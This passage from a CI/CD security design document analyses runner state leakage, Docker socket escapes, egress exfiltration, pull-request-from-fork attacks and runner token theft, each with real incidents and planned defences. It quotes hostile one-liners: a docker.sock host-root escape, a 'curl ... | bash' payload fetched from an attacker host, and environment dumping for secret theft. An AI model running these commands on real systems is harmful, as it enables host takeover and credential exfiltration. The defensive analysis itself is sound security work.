registration has a 30-day TTL (Phase 1), with rotation via
`POST /api/runners/{id}/rotate-token` (already in the existing
doc); heartbeat issues a 1-hour short-lived token that the runner
uses for job pickup, and the heartbeat is itself authenticated by
mTLS so it cannot be hijacked.

---

# Problem 6. Persistent-runner state leakage

## What the problem actually is
A long-lived runner — the self-hosted kind, where the daemon stays
up for weeks — accumulates state on disk and in memory between
jobs: build artifacts in `/cache`, `~/.cargo` registries,
`~/.npm` caches, environment variables that survived a job because
the daemon didn't reset its env, SSH keys written by past jobs,
mounted Docker volumes that weren't cleaned, `~/.gitconfig` from
the last user. "Trust" here means: *job N+1 in repo Y starts with
nothing job N in repo X had access to*. The blast radius is not
"job N+1 can read repo X's source" (the workflow already handles
that) — it is "job N+1 inherits credentials, files, or environment
from job N, and *cannot tell* that the inherited state exists".
Failure looks like: a job in repo Y reads `~/.ssh/id_rsa` that a
prior job in repo X planted; a job in repo Y reads
`/var/run/secrets/kubernetes.io/serviceaccount/token` that a
prior job in a different tenant wrote when the runner was
misconfigured; a job reads `/cache/<tenant-X-key>` that wasn't
cleared; a job inherits `GITHUB_TOKEN` of the prior repo's last
workflow because the daemon didn't reset env.

## Why it's hard
Three reasons. First, *performance pressures against isolation*.
A 60-second `cargo build` cache vs an 8-minute cold rebuild is the
difference between a usable CI system and an unusable one. Every
mitigation that says "throw away the cache between jobs" gets
priced against the developer-experience tax. Second, *the daemon
process is the attacker's neighbour*. The job container is
sandboxed; the daemon process is *not*. Anything the daemon has
read-access to, a job can read. NCC Group's 2022 assessment of
10 real CI/CD compromises documented multiple instances of
"shared runners with no isolation between tenants" — a developer
with limited access to one repo was able to dump env vars from
jobs running other repos, because the runner daemon carried the
secrets through to the next job [20]. Third, *the threat model
breaks when the runner is cross-tenant*. GitHub Actions'
documentation explicitly warns: "Self-hosted runners should not
be used with public repositories" because of exactly this issue
— a malicious PR from a fork will execute on your runner with
your secrets [4]. Forgejo / Gitea Runner state the same rule:
"don't use a runner you don't trust for your repository" [8].
But the *enforcement* — actually isolating state between tenants
on the same runner — is rare in practice.

## Real-world citation (persistent-runner state leakage)
- **Date:** 2022 (assessment timeline, published 2022-08).
- **Vendor / System:** Multiple unnamed GitLab-CI installations
  assessed by NCC Group; documented in their 2022 paper
  *10 real-world stories of how we've compromised CI/CD pipelines*.
- **CVE / Advisory:** No CVEs assigned (assessments of customer
  environments).
- **What happened:** NCC Group consultants found that shared
  GitLab runners were configured with *trivial* environment
  variables storing auth tokens and passwords, exposed to *any*
  developer who had push access to *any* repo on the same GitLab
  instance. "One developer who was only supposed to push code to
  a certain repository could also get access to secrets and
  highly privileged repositories" [20].
- **How it worked:** The runner daemon held the secrets in its
  own env (because every job was treated as needing them). A job
  in a low-privilege repo ran `printenv` and read the runner's
  entire env. The secret was *never scoped* to the job; it was
  scoped to the daemon.
- **Lesson:** The runner daemon is part of every job's blast
  radius. Secrets must be scoped to the job, not the daemon.
- **URL:** https://www.nccgroup.com/research-blog/10-real-world-stories-of-how-we-ve-compromised-cicd-pipelines/

A second corroborating incident:
- **Date:** 2023 (Chia Network).
- **Vendor / System:** Chia Network's self-hosted GitHub Actions
  runner fleet; vanilla Docker container with no userspace
  sandbox.
- **CVE / Advisory:** No CVE; referenced in OpenForge's
  `docs/ci-security.md` §2 as the proximate motivator for the
  gVisor choice.
- **What happened:** A malicious workflow definition escaped the
  vanilla Docker container (no runsc) and obtained a shell on the
  runner host.
- **Lesson:** Long-lived self-hosted runners with broad tenant
  scope are a single escape away from a fleet-wide compromise.
- **URL:** https://github.com/juw12/openforge/blob/main/docs/ci-security.md
  (internal)

## Defenses / mitigations used in production today
- **GitHub-hosted runners** are *not persistent* — each job
  launches a fresh VM, the VM is destroyed, and the next job gets
  a new VM. There is no state leakage between jobs because there
  is no state between jobs. This is the gold standard; it is also
  expensive.
- **GitLab Runner** supports "protected" runners — runners that
  only accept jobs from protected branches. Combined with
  *runner-level* scoping (project, group, instance), this reduces
  the cross-tenant surface but does not eliminate it; the runner
  daemon still carries state.
- **Buildkite Elastic CI** spawns a new EC2 instance per job and
  terminates it on completion. Same model as GitHub-hosted.
- **Drone** runs steps in ephemeral Docker containers but the
  Docker *daemon* is persistent; volumes mounted in the daemon
  (e.g., `/var/lib/docker`) carry state.
- **Gitea / Forgejo Runner** documents the threat model plainly
  and explicitly says the runner is responsible for isolating
  its own state.

## What I'd need to do for OpenForge
**The runner daemon must be the untrusted neighbour, not the job.**
Concretely: (1) **Per-job ephemeral filesystem.** The runner
daemon writes the workspace into a *tmpfs* (already in the
existing `docs/ci-security.md` §3), and the cache directory is
the only persistent location — and that is *cryptographically*
scoped to `(tenantId, jobId)` (see Problem 2). (2) **Per-job
env reset.** The runner daemon starts each job with an empty
environment, *then* injects only the secrets explicitly requested
by the workflow for that job. No inheritance. (3) **No persistent
state on the runner host's disk.** `/home/runner/.ssh`,
`/home/runner/.npm`, `/home/runner/.cargo` etc. are wiped
between jobs; the runner image is rebuilt nightly from a
known-clean base. (4) **The runner daemon runs as a non-root
UID** (UID 1001 in the existing doc) and has *no read access* to
the job container's tmpfs after the job ends. (5) **Per-tenant
runner fleets are the default.** When a repo is created, the
admin chooses whether to (a) use a shared pool (lower cost, lower
trust — internal teams only) or (b) provision a dedicated runner
fleet (higher cost, higher trust — required for any workflow
that handles production secrets). Cross-pool isolation is
mandatory — a runner registered for tenant X must not pick up
jobs for tenant Y even if the runner has the matching label.

---

# Problem 7. Privileged container misuse (docker.sock, --privileged)

## What the problem actually is
CI workflows need to *build* containers. To do that, the job
container needs access to a Docker daemon. The two patterns —
mounting `/var/run/docker.sock` from the host into the job
container, or running the job container itself with
`--privileged` so it can host its own DinD — both hand the
attacker root on the host that runs the daemon. "Trust" here means:
a workflow can build and push container images *without* having
arbitrary code execution on the runner host's kernel or
filesystem. Failure looks like: a job does `docker run -v /:/host
alpine chroot /host sh` (docker.sock pattern) and gets a root
shell on the runner host, then reads `/etc/gitlab-runner/config.toml`
for the runner's token, then exfiltrates cloud creds from
`/home/runner/.aws/credentials`. Or a job with `--privileged`
mounts `/dev/sda1` (host disk) and `chroot`s into it. Both are
*single-line* escapes that do not require a kernel CVE.

## Why it's hard
Two reasons. First, *CI workflows genuinely need Docker*. The
dominant pattern in 2025–2026 is "build a container, push to a
registry, deploy". A CI runner that says "no Docker in jobs" is
not a CI runner — it's a no-op for half the use cases. So the
constraint is real: the job needs *some* Docker access, but not
*the host's* Docker access. Second, *the host socket is the
canonical interface*. `/var/run/docker.sock` is a Unix socket
controlled by the host's dockerd. Any process that can write to
the socket can ask dockerd (running as root on the host) to
launch a new container with arbitrary options, including
`--privileged` and `-v /:/host`. The Docker API is the
exfiltration channel; the attacker doesn't need a kernel exploit.
The Reflex / HackTricks / NCC documentation all converge on the
same lesson: docker.sock access is root on the host [21][22][20].

## Real-world citation (privileged/docker.sock misuse)
- **Date:** 2022 (assessment; published 2022-08).
- **Vendor / System:** Multiple unnamed GitLab Runner
  installations assessed by NCC Group; documented in their 2022
  CI/CD assessment paper.
- **CVE / Advisory:** No CVEs (assessments).
- **What happened:** "On one job, the Gitlab Shared Runners mount
  the Host's Docker socket to CI/CD job containers at runtime.
  While this allows legitimate developers to run arbitrary Docker
  commands on the host for build purposes, it also allows build
  jobs to deploy privileged containers on the host itself to
  escape their containment. This also provides attackers with a
  window through which they can compromise other build jobs
  running on the host" [20].
- **How it worked:** A developer with push access to *any* repo
  using the shared runner wrote a `.gitlab-ci.yml` that did
  `docker run -v /:/host --rm alpine chroot /host bash`. The job
  ran inside a Docker container with `/var/run/docker.sock`
  mounted, asked dockerd to launch the new container with the
  host filesystem mounted, and got a root shell on the runner
  host.
- **Lesson:** docker.sock = host root. There is no safe way to
  mount the host socket; there is only a way to provide a
  *restricted* dockerd (rootless, namespace-scoped) that does
  not have the privileges the attacker wants.
- **URL:** https://www.nccgroup.com/research-blog/10-real-world-stories-of-how-we-ve-compromised-cicd-pipelines/

A second, more recent incident with the same mechanism:
- **Date:** 2025-04 (StepSecurity disclosure).
- **Vendor / System:** `step-security/harden-runner` policy
  *disable-sudo* on GitHub Actions runners.
- **CVE / Advisory:** No CVE; StepSecurity blog post.
- **What happened:** "The researchers identified a bypass: if
  the runner user has access to the dockerd or containerd
  socket, they can start a privileged container, mount the host
  filesystem, and regain root access — effectively restoring the
  sudo capability" [23]. A policy intended to deny root was
  bypassed because the runner user had access to the Docker
  socket.
- **How it worked:** `disable-sudo` removes the runner user from
  `sudoers`. The attacker (who has code execution in the runner
  context) writes to `/var/run/docker.sock`, asks dockerd to
  start a `docker run -v /:/host --privileged alpine chroot
  /host sh`, and becomes root again via the dockerd route.
- **Lesson:** "Drop sudo" is not a defense against a user with
  Docker access. The Docker socket is the root escalation vector.
- **URL:** https://www.stepsecurity.io/blog/evolving-harden-runners-disable-sudo-policy-for-improved-runner-security

## Defenses / mitigations used in production today
- **GitLab Runner** has *two* documented Docker-in-CI patterns:
  (a) bind-mount `/var/run/docker.sock` — explicitly warned
  against in their own docs as "exposes your host to privilege
  escalation"; (b) Docker-in-Docker (DinD) with TLS, which runs
  a *separate* dockerd inside the job container, accessible only
  by that container, with TLS client certs. The GitLab docs
  explicitly state "this effectively disables the container's
  security mechanisms and expose your host to privilege
  escalation" for option (a) [5][6].
- **Buildkite** runs Docker builds inside the agent's container
  via DinD or via kaniko (rootless, daemonless, builds OCI
  images without Docker-in-Docker or socket binding).
- **Drone** uses ephemeral Docker containers per pipeline step,
  but the *daemon* is the host daemon — Drone is not built for
  multi-tenant.
- **GitHub-hosted runners** use DinD for actions that need it
  (`services: docker:dind` in the workflow), with the daemon
  scoped to the job container.
- **Gitea / Forgejo** document that "to build container images
  in workflows or run actions that use Docker, additional
  configuration is required" — they do not provide it
  out-of-the-box and rely on the operator to choose DinD or
  socket binding [10].

## What I'd need to do for OpenForge
**No host socket ever, full stop.** The runner daemon MUST NOT
mount the host's `/var/run/docker.sock` into any job container.
For workflows that need to build images, OpenForge ships: (1)
**Per-job DinD with TLS.** The runner daemon launches an inner
`docker:dind` *service container* alongside the job; the
inner dockerd is reachable only via the job's network namespace
(using `--link` or shared network) and authenticated with TLS
client certs generated per-job, valid for the lifetime of the
job. The inner dockerd runs in a *user namespace* and cannot
mount the host filesystem even if asked. (2) **kaniko as the
default for image builds.** Workflows that only need to build
images (no docker compose, no nested containers) should be
encouraged to use kaniko, which builds OCI images from a
Dockerfile without any Docker daemon — entirely userland.
(3) **OCI BuildKit in a separate container** (BuildKit v0.12+)
for advanced use cases, with the same per-job TLS isolation.
(4) **`--privileged` is forbidden.** The OpenForge runner
registration config has a `forbiddenCapabilities` list that
includes `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_NET_ADMIN`, and
the runner daemon refuses to launch a job container with
`--privileged` regardless of what the workflow asks for — the
check is *server-side* in the API (job validation) and *runner-side*
(docker run wrapper). (5) **Egress policy** at the runner level:
the job container's network is `--network=none` by default; if
the workflow asks for `network: 'restricted'` (needed to reach
the inner dockerd), the iptables allowlist is *only* the inner
dockerd's TLS port and the artifact/CAS endpoints — no public
internet.

---

# Problem 8. Network egress exfiltration

## What the problem actually is
The job container has a network interface (unless `--network=none`).
That interface is a *data egress channel* — for stolen secrets, for
second-stage payloads, for the attacker to phone home. "Trust"
here means: a job that exfiltrates a secret to an attacker
server, or pulls a malicious payload at runtime, fails. The
attack surface is every byte that crosses the runner's network
boundary — DNS queries, HTTP requests, raw TCP, even
ICMP-tunnelled exfil. The attacker's goal is to *defeat
egress filtering*, either by encoding the secret so it looks
legitimate (HTTPS to a high-reputation CDN), by piggybacking on
an allowed domain (a typosquat on a package registry), or by
DNS tunneling (a single TXT query carries 200+ bytes per label).

## Why it's hard
Four reasons. First, *builds genuinely need outbound network
access*. A Node.js build hits `registry.npmjs.org`; a Python
build hits `pypi.org`; a container build hits `ghcr.io`. An
egress policy that blocks all outbound traffic is a non-starter.
Second, *the attacker controls the source of the outbound request*.
The job has a shell. It can `curl`, `wget`, `python -c "import
urllib..."`, `node -e`, raw `nc`, DNS-over-HTTPS — any of a
dozen channels. Third, *domain allowlists are too permissive to
be useful*. Wildcards like `*.amazonaws.com` include
attacker-controlled S3 buckets; `*.cloudfront.net` includes
attacker-controlled distributions. The Ultralytics December 2024
incident showed the attacker exfiltrating to gist.githubusercontent.com
— a domain no sensible allowlist would block [24]. Fourth, *the
attacker can use the *platform's own network* as the exfil
channel*. The Gheist campaign reported by Wiz in October 2026
exfiltrated secrets via `github.com/api/v3/...` (the GitHub
API itself) — the malicious workflow printed secrets to the
log, then *deleted the log* via the API, all over the official
HTTPS channel [13]. Network-layer egress controls see only a
"legitimate" GitHub API call.

## Real-world citation (network egress exfiltration)
- **Date:** 2024-12-04 to 2024-12-11 (active compromise).
- **Vendor / System:** Ultralytics Python package
  (`ultralytics/ultralytics`); StepSecurity / Palo Alto Unit 42
  attribution.
- **CVE / Advisory:** No CVE; StepSecurity hardening advisory.
- **What happened:** Attacker opened a PR from a fork exploiting
  `pull_request_target` on `format.yml`; the malicious payload
  fetched a second-stage script from `gist.githubusercontent.com`
  (HTTPS, allowed by every reasonable allowlist), installed a
  cryptominer in the build cache, which was then packaged into
  releases v8.3.41 and v8.3.42 [24][17].
- **How it worked:** `curl https://gist.githubusercontent.com/...`
  — a request to a high-reputation GitHub-owned domain that
  cannot reasonably be blocked. The attacker chose the egress
  channel *knowing* that egress allowlists would not catch it.
- **Lesson:** Allowlist-based egress filtering is structurally
  defeated by attackers who pick a high-reputation domain. The
  defense has to be *behavioural* — flag unexpected outbound
  connections — not *signature-based*.
- **URL:** https://www.stepsecurity.io/blog/prevent-ultralytics-style-ci-cd-security-attacks-with-network-security-controls

A second incident with a *very different* exfiltration channel:
- **Date:** 2026-04-24 to 2026-04-25 (compromise window); TeamPCP
  campaign.
- **Vendor / System:** elementary-data Python project;
  Checkmarx KICS CI; tracked by Trend Micro research 2026-05-13.
- **CVE / Advisory:** No CVE; campaign attribution.
- **What happened:** An attacker-controlled account commented on
  an open elementary-data PR with
  `curl -sSL https://litter.catbox.moe/iqesmbhukgd2c7hq.sh | bash`.
  The workflow file `.github/workflows/update_pylon_issue.yml`
  interpolated `${{ github.event.comment.body }}` directly into
  a `run:` block, executing the bash. The payload exfiltrated
  via HTTPS POST to a Cloudflare-fronted C2 with a custom
  actor-branded header [25].
- **How it worked:** GitHub Actions `${{ }}` expression expansion
  happens *before* the shell, so user-controlled input flowed
  directly into the runner's bash. The exfil destination was
  `litter.catbox.moe` — not a well-known package registry, not
  something a wildcards allowlist would include; a behavioural
  detector (or a hard default-deny) would have caught it.
- **Lesson:** Default-deny is the only egress posture that
  catches the long tail. Allowlists are useful for the
  well-behaved 99%, not for catching the attacker.
- **URL:** https://www.trendmicro.com/ru_ru/research/26/e/analyzing-teampcp-supply-chain-attacks.html

## Defenses / mitigations used in production today
- **GitHub-hosted runners** have *no* egress filtering — they can
  reach any IP on any port. The premium tier ("Larger Runners")
  supports VNet integration with Azure for custom NSG rules, but
  the default is open. GitHub's guidance is to use the Actions
  network egress controls via allowlists on the *organization*
  level (an opt-in for GitHub Enterprise).
- **GitLab CI** supports `network: 'bridge' | 'host' | 'none'`
  per-job, plus egress controls via Kubernetes NetworkPolicy if
  the runner is on Kubernetes. Default for shell executor is
  unrestricted.
- **Buildkite** lets operators configure the agent host's
  firewall; there is no in-agent egress control.
- **Drone** does not provide egress controls; relies on the
  operator's host firewall.
- **StepSecurity Harden-Runner** (commercial) provides an
  egress-allowlist policy with anomaly detection — flags any
  outbound connection to a domain not on the per-workflow
  allowlist, with a configurable block/audit mode [24].
- **Open source practice**: operators put the runner fleet
  behind a default-deny firewall with explicit outbound rules.

## What I'd need to do for OpenForge
**Default-deny egress, with per-workflow explicit allowlists that
are validated against a server-side manifest.** (1) **Phase 1:
`--network=none` is the only mode.** Any job that needs network
*must* declare `requestedNetwork: 'restricted'` in the workflow,
and the API validates that the repo's policy permits it. The
runner daemon creates a per-job network namespace with iptables
OUTPUT default-DROP and an explicit allowlist. (2) **Phase 2:
allowlist is server-signed.** The workflow declares
`requestedEgress: ['pypi.org', 'files.pythonhosted.org',
'github.com', 'api.openforge.example']` and the API signs the
list with a per-job key embedded in the `requestToken`. The
runner refuses to add an egress rule that isn't in the signed
list. (3) **Phase 2: DNS is filtered.** The runner provides a
*local* DNS resolver that only resolves the allowlist domains;
any other query returns NXDOMAIN. Defeats DNS tunneling. (4)
**Phase 2: anomaly detection.** The runner ships an eBPF-based
egress monitor that logs every outbound connection (5-tuple,
destination domain, bytes) and flags any *new* domain not on
the allowlist. Logs go to S3 with object lock for
post-incident forensics. (5) **The runner API never speaks the
public internet on behalf of the job.** The runner daemon
proxies artifact uploads and cache fetches through its own
authenticated channel to the OpenForge API; the job container
*cannot* reach `api.openforge.example` directly even if it
wanted to.

---

# Problem 9. PR-from-fork credential theft

## What the problem actually is
A pull request from a fork is, by design, opened by *someone who
does not have write access to the base repo*. The PR workflow
runs *their* code. "Trust" here means: a PR from a fork cannot
obtain credentials that would let it push to the base repo,
deploy to production, sign releases, or impersonate a
maintainer. The attack surface is the workflow trigger model:
`pull_request` (runs the *fork's* code, with no secrets and
read-only `GITHUB_TOKEN`) vs `pull_request_target` (runs the
*base's* code, with full secrets and write `GITHUB_TOKEN`) —
and the *human error* of using `pull_request_target` while
checking out the fork's code. Failure looks like: a workflow
uses `pull_request_target`, calls `actions/checkout` with
`ref: ${{ github.event.pull_request.head.sha }}`, and runs
`make test` — the fork's `Makefile` runs with the base repo's
production secrets and a write token. The attacker pushes a
malicious commit to their fork, opens the PR, the workflow
runs, the secrets are exfiltrated. This is the single most
exploited CI vulnerability class of the last five years.

## Why it's hard
Three reasons. First, *the trigger is necessary*. Maintainers
*want* to run CI on PRs from forks — that's how external
contributions are vetted. The workflow needs *some* level of
access (e.g., to label the PR, to post a comment, to run tests
against a private registry). `pull_request_target` exists
because some workflows need secrets; the *misuse* is doing that
while also running fork code. Second, *the check-out vs run
boundary is easy to confuse*. `actions/checkout@v4` with
`ref: ${{ github.event.pull_request.head.sha }}` looks
identical to `actions/checkout@v4` with no `ref`, but the
semantics are completely different — one checks out fork code,
the other checks out base code. The GitHub Security Lab's
2025-01 paper explicitly calls out that "developers frequently
choose `pull_request_target` because they want to run a fork's
pull request through CI and have access to secrets, for example
to run tests that need a private registry. To do this, they
point `actions/checkout` at the pull request head instead of
the default branch, which is insecure" [11]. Third, *there is
no platform-level enforcement*. GitHub's `pull_request_target`
docs (revised as of December 8, 2025) are now *strict* about
the semantics — the workflow file and checkout always come from
the default branch — but a workflow that explicitly opts out
via `ref: ${{ github.event.pull_request.head.sha }}` is still
permitted, and the maintainer is responsible for the security
of the combination. GitHub's CodeQL query
`actions/untrusted-checkout-critical` was added specifically to
flag this pattern, but it is a *linter* — not a hard
enforcement.

## Real-world citation (PR-from-fork credential theft)
- **Date:** 2021-04-01 to 2021-04-15 (window of active
  exfiltration); Codecov disclosure 2021-04-15.
- **Vendor / System:** Codecov bash uploader; affected ~23,000
  Codecov customers including Twilio, HashiCorp, Rapid7,
  Confluent.
- **CVE / Advisory:** No CVE assigned; Codecov security
  advisory 2021-04-15.
- **What happened:** Attacker modified the Codecov bash
  uploader to extract environment variables from customer CI
  jobs and POST them to an attacker server. Customers using the
  bash uploader as a build step (in workflows triggered by PRs
  from forks *and* from internal branches) had their CI
  environment exfiltrated [26].
- **How it worked:** The bash uploader ran inside every
  customer's workflow. The customer's workflow used
  `pull_request_target` (or equivalent) because the bash
  uploader needed the customer's GitHub token to post coverage
  reports back to the repo. Attacker ran inside the customer's
  CI environment, read `env`, exfiltrated. Twilio, for
  example, had its private repos cloned via the stolen GitHub
  token [26].
- **Lesson:** A third-party build tool that runs in a
  privileged workflow is a credential theft vector. Every CI
  user that runs the tool inherits the tool's compromise.
- **URL:** https://blog.gitguardian.com/codecov-supply-chain-breach/

A more recent variant of the same pattern:
- **Date:** 2026-03 (campaign discovered); StepSecurity
  attribution.
- **Vendor / System:** `awesome-go` GitHub repository
  (maintained by the CNCF and Microsoft-affiliated contributors).
- **CVE / Advisory:** No CVE; "hackerbot-claw" campaign.
- **What happened:** Attacker submitted 6 PRs from a fork
  (#6058 through #6069) over 18 hours, exploiting a
  `pull_request_target` workflow that checked out fork code and
  ran it via `go run ./.github/scripts/check-quality/`. The
  attacker's `init()` function in Go ran before `main()`,
  exfiltrated `GITHUB_TOKEN` to `recv.hackmoltrepeat.com` and
  pulled a second-stage payload [27].
- **How it worked:** The classic "pwn request" pattern. The
  workflow file in the base repo checked out the PR head,
  executed it. The attacker's Go `init()` made a single
  outbound call to a C2.
- **Lesson:** `pull_request_target` + `actions/checkout ref=head`
  is the canonical pwn request. The pattern is so prevalent
  that automated tooling finds new instances monthly.
- **URL:** https://www.stepsecurity.io/blog/hackerbot-claw-github-actions-exploitation

## Defenses / mitigations used in production today
- **GitHub Actions** (post-Dec 8 2025): `pull_request_target`
  semantics changed — the workflow file and checkout *always*
  come from the default branch; `GITHUB_REF` resolves to the
  default branch. Workflows that explicitly override via
  `ref: ${{ github.event.pull_request.head.sha }}` are still
  permitted but are now flagged by CodeQL
  (`actions/untrusted-checkout-critical`) and by the GitHub
  Security Lab's own linter [11][14]. The recommended pattern is
  a *two-workflow* split: an unprivileged `pull_request`
  workflow runs the fork's code with no secrets, and a
  privileged `workflow_run` workflow (triggered by completion
  of the first) handles anything that needs secrets.
- **GitLab CI** does not have the same trigger distinction
  (GitLab's `merge_request_event` always runs in the merge
  context with limited scope), but enforces similar isolation
  via `rules:` and `when:` blocks; fork MRs from untrusted
  users can be configured to run with no `CI_PUSH_TOKEN` and
  no protected variable access.
- **Buildkite** runs pipelines from the *base* branch's
  `.buildkite/pipeline.yml`; PRs from forks cannot redefine the
  pipeline (the file is loaded from the base repo, not the
  fork).
- **Drone** has a similar model — the `.drone.yml` is loaded
  from the base repo.
- **Forgejo Actions** has a dedicated
  *Forgejo Actions | Security of Pull Requests* doc page
  explaining the trust model; the recommended pattern is the
  same split — unprivileged workflow for fork PRs, privileged
  workflow gated by approval for trusted code.
- **OWASP GitHub Actions Security Cheat Sheet** explicitly
  recommends "Never check out (via `actions/checkout` or GitHub
  CLI) and run untrusted code in this context" [28].

## What I'd need to do for OpenForge
**Two-workflow split, structurally enforced at upload time.**
OpenForge ships two trigger semantics, mirroring the GitHub
distinction but with a server-side enforcement that GitHub does
not provide: (1) **`on: pull_request`** — runs in the *base
repo's* workflow file (not the fork's), in the merge commit
context, with a *read-only* `requestToken`, with *no* access
to repo secrets (only `GITHUB_TOKEN`-equivalent with read
scope). The job container runs with `--cap-drop=ALL
--user=1000 --network=restricted --runtime=runsc` and has
read-only access to the merge commit. (2) **`on:
pull_request_target`** — same base-repo workflow file, but
runs in the base commit context (latest main, not the PR
head), with access to secrets and a *write* `requestToken`.
The validator at upload time rejects any `pull_request_target`
workflow that includes `actions/checkout` with `ref:
${{ github.event.pull_request.head.* }}` *or* that pipes fork
code into a `run:` block. CodeQL-equivalent static analysis
(`apps/api/src/lib/workflow-lint.ts`) flags these patterns as
hard errors, not warnings. (3) **The privileged workflow must
require an environment gate.** Secrets with `class: high` are
*only* delivered to workflows that run in a protected
environment with required reviewers; the runner refuses to
deliver the secret until the review is approved. (4) **PRs
from forks that the maintainer wants to run with full secrets
must be explicitly approved via a label workflow** — the
pattern GitHub deprecated in 2025 but that OpenForge keeps as
an opt-in for repos that need it (e.g., security research
repos that accept third-party exploits).

---

# Problem 10. Runner token theft and impersonation

## What the problem actually is
A registered runner holds a credential that *proves* it is the
runner it claims to be — a token, a JWT, an mTLS client cert,
or a registration secret. If an attacker steals that
credential, they can *impersonate the runner*: register their
own machine with the server, claim to be runner R, and execute
jobs (or exfiltrate the jobs R was assigned). "Trust" here means:
the credential the runner holds is *not enough on its own* to
execute jobs; the credential is bound to a specific
(hardware, network, persona) and an attacker who steals the
bytes cannot present them from a different machine. The attack
surface is every place the credential lives: the runner host's
disk, the runner host's memory, the TLS session between runner
and server, the registration token as it traverses the
operator's CI bootstrap pipeline, the runner daemon's logs, and
the operator's secret manager.

## Why it's hard
Three reasons. First, *the runner must store the credential
somewhere*. A credential that lives in memory only and is lost
on reboot requires manual re-registration every reboot — not
operationally acceptable. So the credential is on disk,
encrypted with a key, or — more commonly — in plaintext env
var. Second, *the credential is exactly what an attacker wants*.
A CI runner's token is a *high-value target*: it provides
access to *all repos that trust that runner*. The Gheist
campaign (October 2026) operated by stealing *user* PATs, not
runner tokens, but the runner-token variant is structurally the
same — single credential, broad blast radius. Third, *the
credential persists across the runner's lifetime*. A
self-hosted runner may run for 30+ days on a single bootstrap
token (Gitea / Forgejo model [19]), so the window of
exposure is long. The defender's dilemma: shorter TTLs are
more secure but operationally harder; longer TTLs are easier
but one breach gives 30 days of access.

## Real-world citation (runner token theft)
There is no single canonical public incident framed as "runner
registration token theft". The closest, well-documented
analogous incidents with a CI control-plane token:
- **Date:** 2024-12-06 (initial compromise) → 2025-03-14 (payload
  shipping).
- **Vendor / System:** SpotBugs / SonarQube GitHub Actions
  token → Reviewdog maintainer → tj-actions.
- **CVE / Advisory:** **CVE-2025-30066** + Unit 42 reconstruction.
- **What happened:** A SpotBugs maintainer's Personal Access
  Token was exfiltrated via a malicious PR exploiting
  `pull_request_target` (December 6, 2024). The PAT was used
  three months later to add an attacker (`jurkaofavak`) as a
  member to the `spotbugs/spotbugs` repo, push a malicious
  workflow that leaked a Reviewdog maintainer's PAT, and use
  *that* PAT to override the `reviewdog/action-setup@v1` tag
  [17].
- **How it worked:** A PAT is the same *class* of credential as
  a runner token — a bearer credential with broad scope, long
  TTL, stored in plaintext on disk. The theft was a
  `pull_request_target` workflow reading `${{ github.token }}`
  from context, but the *structural lesson* is identical:
  bearer tokens that have broad scope and persist on disk are
  one workflow misconfiguration away from total compromise.
- **Lesson:** Token theft is the upstream cause of most CI
  supply-chain incidents. The defense is not a better
  password — it is a credential architecture that does not
  rely on bearer tokens.
- **URL:** https://unit42.paloaltonetworks.com/github-actions-supply-chain-attack/

A second corroborating incident:
- **Date:** 2026-04-24 (TeamPCP elementary-data campaign).
- **Vendor / System:** elementary-data GitHub repository;
  `update_pylon_issue.yml` workflow.
- **CVE / Advisory:** No CVE; Trend Micro research 2026-05-13.
- **What happened:** Attacker commented on an open PR with a
  `curl ... | bash` payload; the workflow interpolated
  `${{ github.event.comment.body }}` into a `run:` block. The
  payload ran with a `GITHUB_TOKEN` that had `contents: write`,
  allowing the attacker to push malicious commits and trigger
  the release workflow to build and *sign* the malicious
  package [25].
- **How it worked:** `issue_comment` is one of the triggers that
  GitHub's CodeQL flags as "auto-grant[ing] a workflow elevated
  privileges" [14]. The token was a legitimate, well-scoped
  PAT, but the *workflow's* design gave it too much power for
  too little validation.
- **Lesson:** Token scope is a workflow-design problem, not a
  server-side enforcement problem — *unless* the server
  enforces scope at job-assignment time.
- **URL:** https://www.trendmicro.com/ru_ru/research/26/e/analyzing-teampcp-supply-chain-attacks.html

## Defenses / mitigations used in production today
- **GitHub Actions self-hosted runners** use a JIT-exchanged
  short-lived registration token (typically 1-hour TTL)
  followed by a per-run session JWT. The runner is registered
  with the long-lived PAT only once, and the PAT is never
  reused for job pickup.
- **GitLab Runner** uses a `RUNNER_TOKEN` exchanged at
  registration from a `registration-token`; both can be
  rotated by re-running `gitlab-runner register`. There is no
  inherent hardware binding.
- **Buildkite** uses a per-agent registration token with an
  operator-configurable TTL, combined with a per-job
  organization JWT.
- **Drone** uses a one-time registration token exchanged for a
  long-lived agent secret; no inherent hardware binding.
- **Gitea / Forgejo Runner** uses a registration token
  (`D0gvfu2iHfUjNqCYVljVyRV14fISpJxxxxxxxxxx`) valid until
  manual reset; no inherent hardware binding. The token can
  be used to register *multiple* runners until revoked [19].
  This is the *least* defended production CI runner model
  against token theft.

## What I'd need to do for OpenForge
**No bearer token alone is ever sufficient.** The credential
architecture is the one OpenForge can be most opinionated about,
because we own it end-to-end. The runner daemon must prove
*three* things to the server at every interaction: (a) it
holds a private key, (b) it is running on the hardware it
registered on, (c) the credential has not been revoked.
Concretely: (1) **mTLS with a per-runner client certificate
issued at registration.** The runner's *private key* never
leaves the host (stored in a TPM if available, in a kernel
keyring otherwise). Every API call from the runner is signed
by that private key. An attacker who steals the bearer token
cannot complete the TLS handshake because they don't have the
private key. (2) **Hardware attestation where available.** If
the runner host has a TPM 2.0, the runner daemon emits a
`/sys/class/tpm/tpm0` attestation quote at registration time;
the server stores the expected PCR values and requires the
attestation to match on every heartbeat. An attacker who
copies the credential to a different host cannot produce a
valid attestation. (3) **Token TTL is server-controlled, not
client-controlled.** The server returns a token expiry with
every successful heartbeat; the runner cannot extend its own
TTL. (4) **The bootstrap token is rotated on first use.** As
described in `docs/ci-security.md` §5, the bootstrap token is
used exactly once for registration, then is replaced by a
short-lived session token. The bootstrap token is *revoked*
on the server immediately after the first successful
registration; an attacker who exfiltrates the bootstrap token
from a backup finds it already useless. (5) **Credential
revocation is fast.** A `POST /api/runners/{id}/revoke` call
invalidates the runner's session within 30 seconds; the server
publishes revocation to a list that all *other* runners also
read (so a rogue runner cannot pick up jobs intended for the
revoked runner). (6) **No long-lived credential ever leaves
the runner host.** Cache writes, secret retrieval, job
heartbeats — all use the per-run session token, which is
rotated on every heartbeat.

---

# Priority matrix — likelihood × impact for a greenfield self-hosted platform in 2026

This matrix is for *OpenForge specifically* — a self-hosted
TypeScript monorepo targeting small-to-mid enterprises and
OSS-adjacent teams, deploying Phase 1 in 2026-Q1 to 2026-Q2.
The likelihood axis reflects how often the attack class is
seen in the wild across all CI platforms in 2024-2026. The
impact axis reflects blast radius when the attack succeeds
against a self-hosted runner.

